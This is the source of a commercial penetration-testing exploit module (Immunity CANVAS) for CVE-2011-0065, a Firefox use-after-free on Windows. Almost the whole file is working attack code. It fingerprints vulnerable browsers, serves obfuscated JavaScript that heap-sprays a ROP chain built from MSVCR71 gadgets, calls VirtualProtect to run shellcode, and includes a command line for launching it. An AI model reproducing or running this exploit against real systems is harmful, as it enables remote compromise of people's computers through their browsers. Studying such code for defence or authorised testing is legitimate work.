#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2011
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import hashlib
import random

from exploitutils import *
from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.ua_parser import user_agent_parser

NAME                           = "Firefox"
DESCRIPTION                    = "Client-Side vulnerability in Firefox < 3.6.17 | Firefox < 3.5.19"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2011-0065"
DOCUMENTATION['MFSA']          = "http://www.mozilla.org/security/announce/2011/mfsa2011-13.html"
VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Client Side"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "2000", "XP", "Vista", "7"]

NOTES="""
Run from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.21 -d 5555 -O server_port:8080 -O allowed_attack_modules:firefox_channelredirect -O auto_detect_exploits:0

ROP strategy:

    * MSVCRT71 dependant only, this will need java installed but will bypass ASLR on Windows 7.
        - Use 3 gadgets to stack pivot with mem(ECX):

7C35A843   57               PUSH EDI
7C35A844   8B7C24 0C        MOV EDI,DWORD PTR SS:[ESP+C]
7C35A848   83C7 07          ADD EDI,7
7C35A84B   83E7 F8          AND EDI,FFFFFFF8
7C35A84E   837C24 10 00     CMP DWORD PTR SS:[ESP+10],0
7C35A853   8BF1             MOV ESI,ECX
7C35A855   74 06            JE SHORT MSVCR71.7C35A85D
7C35A857   57               PUSH EDI
7C35A858   FF16             CALL DWORD PTR DS:[ESI]

7C35A379  |> 8B46 0C        /MOV EAX,DWORD PTR DS:[ESI+C]
7C35A37C  |. 8B00           |MOV EAX,DWORD PTR DS:[EAX]
7C35A37E  |. FF76 0C        |PUSH DWORD PTR DS:[ESI+C]
7C35A381  |. 8946 08        |MOV DWORD PTR DS:[ESI+8],EAX
7C35A384  |. FF56 04        |CALL DWORD PTR DS:[ESI+4]

7C348B05   94               XCHG EAX,ESP
7C348B06   C3               RETN

        - VirtualProtect ROP
        - Shellcode
"""

CHANGELOG="""

"""

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "Firefox", "")]
        self.plugin_info = None # we want clientd to give us a plugin dict
        self.supports_dns_mosdef = False
        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="" #bad strings are for wusses :>
        self.name=NAME 
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")


    def random_dummy_string(self, prefix=""):
        h = hashlib.new('sha1')
        h.update(str(random.random() * 10).replace('.', ''))
        retval = h.hexdigest()
        retval = '%s%.5s' % (prefix, retval)
        return retval
    
    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means "running Firefox and a language we have 
        a target for.
        """ 
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        

        if 'Windows' in parsed['os']['family'] and \
           parsed['user_agent']['family'] == 'Firefox' and \
           parsed['user_agent']['major'] == '3':
            
            minor = parsed['user_agent']['minor']
            
            try:
                patch =  int(parsed['user_agent']['patch'])
            except Exception:
                return 0

            if minor == '5' and patch < 19:
                return 100
            
            if minor == '6' and patch < 17:
                return 100
            
        return 0

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
    
    def makefile(self):
        replaces={}
        replaces["SHELLCODE"]=urluencode(self.shellcode)
        
        filedata="""
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>DieFirefoxDie</title>
    </head>
    <body>
        <applet code="ropplet.class" width="100" height="100" name="ropplet"></applet>
        <object id="DieFirefoxDie"></object>
        <script type="application/javascript">
        """
        
        js="""
            function hexa(val)
            {
                var str = new Number(val).toString(16);
                while (str.length < 4)
                    str = "0" + str;

                return str;
            }

            function myescape(addr)
            {
                var str = "";
                str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
                return unescape(str);
            }

            function create_block(q){
                var base  = 0x0ea10064;
                var block = "";

                //fill with some aligment bytes
                while(block.length < 0x64/2){
                    block+= unescape("%ucafe");
                }

                //stack pivot
                block+= myescape(0x7C35A379);
                block+= myescape(0x7C348B05);
                block+= myescape(0x00000000);
                block+= myescape(base+0x1c);
                block+= myescape(0xCAFEEEEE);
                block+= myescape(0xCAFEEEEE);
                block+= myescape(0x7C35A843);
                block+= myescape(base+0x20);

                //rop
                block+= myescape(0x7C344CC1); //pop eax;ret
                block+= myescape(0x7C37A140); //VirtualProtect Address
                block+= myescape(0x7C3530EA); //mov eax,[eax];ret
                block+= myescape(0x7C341FE4); //call eax;ret
                block+= myescape(base+0x40);
                //block+= myescape(base);     //Address
                block+= myescape(0x4000);   //Length
                block+= myescape(0x40);     //Prot
                block+= myescape(base);     //OldProt
                block+= myescape(base+0x44);
                //shellcode
                var shellcode = unescape("SHELLCODE");
                block+= shellcode;
                var quant = (q/2)-8;
                while(block.length < quant){
                        block+=unescape("%ucccc");
                }
                return block;
            }

            function spray_str(str, quant){
                var t = new Array();
                for(var i=0; i < quant; i++){
                        t.push(unescape(str));
                }
                return t;
            }

            function Exploit()
            {
                var object = document.getElementById("DieFirefoxDie");
                // void onChannelRedirect(in nsIChannel oldChannel, in nsIChannel newChannel, in unsigned long flags);
                object.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null, new String, 0);

                // Replace the object
                // 604d4e72 ff5118          call    dword ptr [ecx+18h]  ds:0023:0c0c0079=????????
                var replace = unescape("d%u0ea1");
                var padding = unescape("AAAABBBBCCCCDDDD");

                //create spray
                var spray = create_block(0x1000);
                var t = spray_str(spray,0xc000);
                object.data = "";
            }

            setTimeout("Exploit();", 1000);
"""
        
        for k,v in replaces.iteritems():
            js=js.replace(k,v)
        
        filedata+=self.jsObfuscator.obfuscate(js)
        #filedata+=js
        
        filedata+="""
</script>
  </body>
</html>
        """        
    
        return filedata
    
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        self.log("Request: "+clientheader.URL)
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log("sending HTML")
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            h.addHeader("Content-Type","text/html")
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
